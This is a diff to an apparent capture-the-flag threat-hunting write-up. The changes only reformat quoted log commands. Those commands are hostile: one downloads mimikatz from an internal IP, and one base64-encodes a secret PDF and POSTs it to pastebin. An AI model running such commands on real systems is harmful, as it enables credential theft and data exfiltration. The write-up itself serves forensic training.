@@ -63,7 +63,7 @@ Answer: **webexservice**
 Attacker has download cookie_recipe2.exe, so we pivot from cookie_recipe2.exe.  
 Search: `ParentProcessImage:C\:\\Users\\minty\\Downloads\\cookie_recipe2.exe`  
 Down the timestamp we will see a command line:  
-> C:\Windows\system32\cmd.exe /c "Invoke-WebRequest -Uri http://192.168.247.175/mimikatz.exe -OutFile C:\cookie.exe "  
+`C:\Windows\system32\cmd.exe /c "Invoke-WebRequest -Uri http://192.168.247.175/mimikatz.exe -OutFile C:\cookie.exe"`  
 Mimikatz is used to dump credentials.
 
 Answer: **C:\cookie.exe**
@@ -98,7 +98,7 @@ Answer: **elfu-res-wks2,elfu-res-wks3,3**
 
 Continue search: `UserAccount: alabaster`  
 Reveals a command line:  
-> C:\Windows\SysWOW64\WindowsPowerShell\v1.0\powershell.exe Invoke-WebRequest -Uri https://pastebin.com/post.php -Method POST -Body @{ "submit_hidden" = "submit_hidden"; "paste_code" = $([Convert]::ToBase64String([IO.File]::ReadAllBytes("C:\Users\alabaster\Desktop\super_secret_elfu_research.pdf"))); "paste_format" = "1"; "paste_expire_date" = "N"; "paste_private" = "0"; "paste_name"="cookie recipe" }
+`C:\Windows\SysWOW64\WindowsPowerShell\v1.0\powershell.exe Invoke-WebRequest -Uri https://pastebin.com/post.php -Method POST -Body @{ "submit_hidden" = "submit_hidden"; "paste_code" = $([Convert]::ToBase64String([IO.File]::ReadAllBytes("C:\Users\alabaster\Desktop\super_secret_elfu_research.pdf"))); "paste_format" = "1"; "paste_expire_date" = "N"; "paste_private" = "0"; "paste_name"="cookie recipe" }`
 
 Answer: **C:\Users\alabaster\Desktop\super_secret_elfu_research.pdf**
 
